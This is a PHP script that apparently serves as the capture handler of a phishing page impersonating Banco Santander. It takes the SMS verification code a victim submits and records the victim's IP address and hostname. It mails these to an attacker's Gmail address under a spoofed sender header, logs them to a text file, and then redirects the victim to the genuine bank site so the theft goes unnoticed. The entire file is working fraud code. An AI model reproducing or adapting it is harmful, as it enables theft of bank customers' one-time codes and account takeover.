<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "__________________Santander_____________\n";
$message .= "\n";
$message .= "SMS            : ".$_POST['sms']."\n";
$message .= "______________ INFOS OF MACHINE _________\n";
$message .= "Ip of Machine              : $ip\n";
$message .= "Host               : $hostname\n";
$message .= "_________| Yawyaw  |__________\n";
$send = "bader.elw@gmail.com";
$subject = "Santander SMS |".$_POST['sms']."| $ip ";
$headers = "From:SMS Santander <webmaster@cajamar.es>";
mail($send,$subject,$message,$headers);
$fp = fopen('santa.txt', 'a');
fwrite($fp, $message);
fclose($fp);
header("Location: https://www.bancosantander.es/es/particulares#");

?>